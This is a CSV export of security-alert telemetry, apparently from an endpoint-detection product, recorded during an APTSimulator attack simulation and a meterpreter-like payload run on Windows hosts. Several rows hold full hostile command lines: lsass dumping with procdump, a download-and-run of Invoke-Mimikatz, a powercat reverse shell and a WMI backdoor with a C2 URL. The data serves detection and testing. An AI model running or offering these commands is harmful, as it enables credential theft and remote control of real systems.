Hostname,OS_Version,Severity,Confidence,Tactic,Technique,Description,Process_Name,Process_Path,Command_Line,User_Name,Parent_Process,Parent_Command_Line,Files_Accessed,Files_Written,IOCs,Network_Accesses,SHA256,MD5
****,Windows 11,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,procdump64.exe,\Device\HarddiskVolume3\Users\Public\procdump64.exe,"""C:\Users\Public\procdump64.exe""  -accepteula -ma lsass.exe ""C:\TMP\somethingwindows.dmp"" ",****,cmd.exe,"""C:\Windows\System32\cmd.exe"" ",,,,,16f413862efda3aba631d8a7ae2bfff6d84acd9f454a7adaa518c7a8a6f375a5,a92669ec8852230a10256ac23bbf4489
****,Windows 11,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,procdump64.exe,\Device\HarddiskVolume3\Users\Public\procdump64.exe,"""C:\Users\Public\procdump64.exe""  -accepteula -ma lsass.exe ""C:\TMP\somethingwindows.dmp"" ",****,cmd.exe,"""C:\Windows\System32\cmd.exe"" ",,,16f413862efda3aba631d8a7ae2bfff6d84acd9f454a7adaa518c7a8a6f375a5,,16f413862efda3aba631d8a7ae2bfff6d84acd9f454a7adaa518c7a8a6f375a5,a92669ec8852230a10256ac23bbf4489
****,Windows 11,High,80,Malware,Malicious File,A process launched with a command line associated with known malware. Investigate the process tree.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe  -Exec ByPasS "". \""C:\TMP\WMIBackdoor.ps1\"";$Trigger2=New-WMIBackdoorTrigger -TimingInterval 60;$Action2=New-WMIBackdoorAction -C2Uri 'http://googleaccountsservices.com' -Backdoor; $Registration2=Register-WMIBackdoor -Trigger $Trigger2 -Action $Action2""",****,cmd.exe,"""C:\Windows\System32\cmd.exe"" ",,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,High,80,Execution,Command and Scripting Interpreter,A script launched that appears to be related to a reverse shell established with a remote system. Review the script and investigate the process tree.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell  -Exec Bypass "". \""C:\TMP\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd""",****,cmd.exe,"""C:\Windows\System32\cmd.exe"" ",,__PSScriptPolicyTest_l3urpkpp.wsj.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Temp),c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,,c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,9d8e30daf21108092d5980c931876b7e
****,Windows 11,Medium,80,Execution,Command and Scripting Interpreter,A suspicious script launched that might be related to malicious activity. A variety of malware families use this technique. Review the script.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell  -Exec Bypass "". \""C:\TMP\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd""",****,cmd.exe,"""C:\Windows\System32\cmd.exe"" ",,__PSScriptPolicyTest_l3urpkpp.wsj.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Temp),c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,,c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,9d8e30daf21108092d5980c931876b7e
****,Windows 11,High,80,Credential Access,OS Credential Dumping,"A PowerShell script appears to be launching mimikatz, a password dumping utility. This is often launched as part of a PowerShell exploit kit. Decode and review the script.",powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe  ""iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"" ",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,High,80,Execution,PowerShell,A PowerShell process downloaded and launched a remote file. This is often the result of a malicious macro designed to drop a variety of second stage payloads. Review the command line.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe  ""iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"" ",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,,,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,High,80,AI Powered IOA,Malicious File,A process launched that meets the cloud-based behavioral machine learning model  threshold for malicious activity. Detection is based on execution pattern and on-sensor ML telemetry.,mim.exe,\Device\HarddiskVolume3\TMP\mim.exe,"""C:\TMP\mim.exe""  ",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,,,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,70,Machine Learning,Cloud-based ML,This file meets the File Analysis ML algorithm's high-confidence threshold for malware.,mim.exe,\Device\HarddiskVolume3\TMP\mim.exe,"""C:\TMP\mim.exe""  ",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,70,Machine Learning,Cloud-based ML,"A file written to the file-system meets the cloud-based machine learning model high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",7z.exe,\Device\HarddiskVolume4\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\helpers\7z.exe,"""D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\\helpers\7z.exe""  e -paptsimulator ""D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\\enc-toolset.7z"" -aoa -o""C:\TMP"" toolset\mim.exe ",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,enc-toolset.7z (\Device\HarddiskVolume4\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator),mim.exe (\Device\HarddiskVolume3\TMP),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,procdump64.exe,\Device\HarddiskVolume3\Users\Public\procdump64.exe,"""C:\Users\Public\procdump64.exe""  -accepteula -ma lsass.exe ""C:\TMP\somethingwindows.dmp"" ",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,,,,16f413862efda3aba631d8a7ae2bfff6d84acd9f454a7adaa518c7a8a6f375a5,a92669ec8852230a10256ac23bbf4489
****,Windows 11,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,procdump64.exe,\Device\HarddiskVolume3\Users\Public\procdump64.exe,"""C:\Users\Public\procdump64.exe""  -accepteula -ma lsass.exe ""C:\TMP\somethingwindows.dmp"" ",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,,16f413862efda3aba631d8a7ae2bfff6d84acd9f454a7adaa518c7a8a6f375a5,,16f413862efda3aba631d8a7ae2bfff6d84acd9f454a7adaa518c7a8a6f375a5,a92669ec8852230a10256ac23bbf4489
****,Windows 11,High,80,Malware,Malicious File,A process launched with a command line associated with known malware. Investigate the process tree.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe  -Exec ByPasS "". \""C:\TMP\WMIBackdoor.ps1\"";$Trigger2=New-WMIBackdoorTrigger -TimingInterval 60;$Action2=New-WMIBackdoorAction -C2Uri 'http://googleaccountsservices.com' -Backdoor; $Registration2=Register-WMIBackdoor -Trigger $Trigger2 -Action $Action2""",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,High,80,Execution,Command and Scripting Interpreter,A script launched that appears to be related to a reverse shell established with a remote system. Review the script and investigate the process tree.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell  -Exec Bypass "". \""C:\TMP\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd""",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,__PSScriptPolicyTest_2wkxfqv2.fmu.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Temp),c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,,c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,9d8e30daf21108092d5980c931876b7e
****,Windows 11,Medium,80,Execution,Command and Scripting Interpreter,A suspicious script launched that might be related to malicious activity. A variety of malware families use this technique. Review the script.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell  -Exec Bypass "". \""C:\TMP\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd""",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,__PSScriptPolicyTest_2wkxfqv2.fmu.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Temp),c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,,c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,9d8e30daf21108092d5980c931876b7e
****,Windows 10,Medium,80,Post-Exploit,Malicious Tool Execution,A suspicious process related to a likely malicious file was launched. Review any binaries involved as they might be related to malware.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Persistence,Registry Run Keys / Startup Folder,A process made a suspicious change to the registry that might indicate a malicious persistence mechanism. Investigate the registry key.,services.exe,\Device\HarddiskVolume3\Windows\System32\services.exe,C:\windows\system32\services.exe,****,wininit.exe,wininit.exe,,,,,1efd9a81b2ddf21b3f327d67a6f8f88f814979e84085ec812af72450310d4281,4eacbe64bb1e7d58e8a26340ed1c7cbd
****,Windows 10,High,80,Privilege Escalation,Bypass User Account Control,A process exhibited unusual behavior that could be associated with a UAC bypass. This may be an attempt to escalate privileges. Investigate the process tree.,cmd.exe,\Device\HarddiskVolume3\Windows\System32\cmd.exe,cmd.exe /c echo eofyzf > \\.\pipe\eofyzf,****,services.exe,C:\windows\system32\services.exe,,,,,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc
****,Windows 10,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Defense Evasion,Process Injection,A process reflectively loaded a DLL associated with the meterpreter exploit kit. Review the DLLs loaded into the process and investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,Medium,90,Defense Evasion,Process Injection,A process containing a reflectively loaded DLL opened a handle to LSASS. Adversaries often use this to evade detection. Review the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,Medium,90,Defense Evasion,Process Injection,A process containing a reflectively loaded DLL opened a handle to LSASS. Adversaries often use this to evade detection. Review the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Defense Evasion,Process Injection,A process reflectively loaded a DLL associated with the meterpreter exploit kit. Review the DLLs loaded into the process and investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,Medium,90,Defense Evasion,Process Injection,A process containing a reflectively loaded DLL opened a handle to LSASS. Adversaries often use this to evade detection. Review the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Defense Evasion,Process Injection,A process reflectively loaded a DLL associated with the meterpreter exploit kit. Review the DLLs loaded into the process and investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,Medium,90,Defense Evasion,Process Injection,A process containing a reflectively loaded DLL opened a handle to LSASS. Adversaries often use this to evade detection. Review the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Defense Evasion,Process Injection,A process reflectively loaded a DLL associated with the meterpreter exploit kit. Review the DLLs loaded into the process and investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
